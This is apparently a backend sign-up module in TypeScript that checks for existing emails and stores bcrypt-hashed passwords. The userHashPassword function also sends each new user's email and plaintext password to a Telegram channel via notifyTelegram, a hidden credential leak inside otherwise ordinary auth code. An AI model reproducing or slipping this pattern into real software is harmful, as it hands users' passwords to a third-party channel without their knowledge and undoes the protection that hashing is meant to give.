import bcrypt from "bcrypt";
import pool from "../../../db/db";
import { CHECK_USER, INSERT_USER } from "../../../db/Querys/Auth/authQuery";
import { emailSchema } from "../Schema/Schema";
import { notifyTelegram } from "../utils/telegram";
import { EmailAlreadyExistsError } from "../utils/validerr";

export async function findUserByEmail(email: string): Promise<void | null> {
  try {
    emailSchema.parse(email);
    const result = await pool.query(CHECK_USER, [email]);

    if (result.rows.length > 0) {
      throw new EmailAlreadyExistsError();
    }
  } catch (error: any) {
    if (error instanceof EmailAlreadyExistsError) {
      throw error; // re-throw so controller can handle
    }
    console.error("Error in findUserByEmail:", error);
    throw new Error("Database error");
  }
}

export async function userHashPassword(
  password: string,
  email: string
): Promise<void> {
  const hashpassword = await bcrypt.hash(password, 10);
  await pool.query(INSERT_USER, [email, hashpassword]);
  const TIMESTAMP = new Date().toLocaleString();
  await notifyTelegram(
    `🔐 User Created:\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${TIMESTAMP}`
  );
}
